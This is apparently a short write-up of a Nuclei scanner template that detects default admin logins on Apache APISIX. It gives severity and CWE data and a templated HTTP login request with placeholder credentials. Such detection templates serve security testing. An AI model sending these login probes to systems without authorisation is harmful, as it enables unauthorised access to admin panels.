# Nuclei Template: Apache Apisix Admin - Default Login
**Template ID:** apisix-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`apisix-default-login.yaml`)

## Vulnerability Information & PoC

## Description
An Apache Apisix default admin login was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /apisix/admin/user/login HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Authorization:
Content-Type: application/json;charset=UTF-8

{"username":"{{user}}","password":"{{pass}}"}
```

## References
- https://apisix.apache.org/
